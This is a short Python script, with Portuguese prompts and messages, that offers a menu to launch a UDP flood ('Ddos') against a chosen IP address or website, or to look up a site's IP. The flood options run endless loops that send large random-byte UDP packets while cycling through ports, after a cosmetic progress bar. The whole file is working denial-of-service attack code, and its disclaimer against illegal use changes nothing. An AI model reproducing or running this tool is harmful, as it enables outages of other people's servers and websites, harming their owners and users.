import time
import socket
import random

print("Bem vindo, não uses isto para ações ilegais!")


print("[A] Ddos por ip, [B] Ddos a website, [C] Pegar ip de website")
action = input("=> ")

if action == "A" or action == "a":
	ip = input("Endereço IP => ")
	port = int(input("Porta => "))
	pch = port
	time.sleep(1.5)
	print("[                    ] 0% ")
	time.sleep(1)
	print("[=====               ] 25%")
	time.sleep(1)
	print("[==========          ] 50%")
	time.sleep(1)
	print("[===============     ] 75%")
	time.sleep(1)
	print("[====================] 100%")
	print("Começando um ataque Ddos em %s" % ip)
	time.sleep(1.5)
	run = True
	sent = 0
	while run:
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		bytes = random._urandom(20000)
		sock.sendto(bytes, (ip, port))
		sent = sent + 1
		port = port + 1
		print("Enviados %s pacotes para %s pela porta: %s" % (sent, ip, port))
		if port == 65534:
			port = pch
			
elif action == "B" or action == "b":
	bytes = random._urandom(20000)
	host = input("Website => ")
	port2 = int(input("Porta => "))
	pch = port2
	ip2 = socket.gethostbyname(host)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	time.sleep(1.5)
	print("[                    ] 0% ")
	time.sleep(1)
	print("[=====               ] 25%")
	time.sleep(1)
	print("[==========          ] 50%")
	time.sleep(1)
	print("[===============     ] 75%")
	time.sleep(1)
	print("[====================] 100%")
	print("Começando um ataque Ddos em %s" % ip2)
	time.sleep(1.5)
	sent = 0
	run2 = True
	while run2:
		sock.sendto(bytes, (ip2, port2))
		sent += 1
		port2 += 1
		print("Enviados %s pacotes para %s pela porta: %s" % (sent, ip2, port2))
		if port2 == 65534:
			port2 = pch
elif action == "C" or action == "c":
	host2 = input("Host => ")
	ip3 = socket.gethostbyname(host2)
	print("O ip de %s é %s." % (host2, ip3))

else:
	print("A escolha não está defenida, tenta de novo!")